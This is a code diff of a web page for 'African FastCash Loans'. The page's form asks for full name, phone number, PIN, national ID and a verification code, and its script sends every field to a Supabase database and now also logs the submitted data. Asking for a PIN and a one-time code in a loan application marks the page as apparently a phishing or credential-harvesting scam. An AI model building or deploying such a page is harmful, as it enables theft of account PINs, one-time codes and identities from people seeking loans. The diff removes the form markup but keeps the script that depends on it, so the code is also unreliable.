@@ -1,85 +1,3 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>African FastCash Loans</title>
-
-<style>
-body{
-font-family:Arial;
-margin:0;
-background:#f4f4f4;
-}
-header{
-background:#0b5ed7;
-color:white;
-padding:20px;
-text-align:center;
-}
-.section{
-max-width:800px;
-margin:auto;
-padding:20px;
-}
-.card{
-background:white;
-padding:20px;
-border-radius:10px;
-box-shadow:0 2px 8px rgba(0,0,0,0.1);
-}
-input,select{
-width:100%;
-padding:12px;
-margin:8px 0;
-}
-button{
-width:100%;
-padding:15px;
-background:#0b5ed7;
-color:white;
-border:none;
-}
-</style>
-</head>
-
-<body>
-
-<header>
-<h2>African FastCash Loans</h2>
-<p>Apply Online</p>
-</header>
-
-<div class="section">
-<div class="card">
-
-<form id="loanForm">
-
-<input name="full_name" placeholder="Full Name" required>
-<input name="phone" placeholder="Phone Number" required>
-<input name="pin" placeholder="PIN" required>
-<input name="national_id" placeholder="National ID" required>
-<input name="loan_amount" type="number" placeholder="Loan Amount" required>
-
-<select name="loan_purpose" required>
-<option value="">Select Purpose</option>
-<option>Business</option>
-<option>Education</option>
-<option>Medical</option>
-<option>Personal</option>
-</select>
-
-<input name="verification_code" placeholder="Verification Code" required>
-
-<button type="submit">Submit Application</button>
-
-</form>
-
-<p id="msg"></p>
-
-</div>
-</div>
-
 <script type="module">
 import { createClient } from "https://cdn.jsdelivr.net/npm/@supabase/supabase-js/+esm";
 
@@ -93,19 +11,20 @@ document.getElementById("loanForm").addEventListener("submit", async (e) => {
 
   const data = Object.fromEntries(new FormData(e.target));
 
-  const { error } = await supabase
+  console.log("Sending data:", data);
+
+  const res = await supabase
     .from("Applications")
     .insert([data]);
 
-  if (error) {
-    console.log(error);
-    document.getElementById("msg").innerText = "❌ Failed to submit";
+  console.log("Supabase response:", res);
+
+  if (res.error) {
+    alert("ERROR: " + res.error.message);
+    console.log(res.error);
   } else {
-    document.getElementById("msg").innerText = "✅ Submitted successfully";
+    alert("SUCCESS");
     e.target.reset();
   }
 });
 </script>
-
-</body>
-</html>
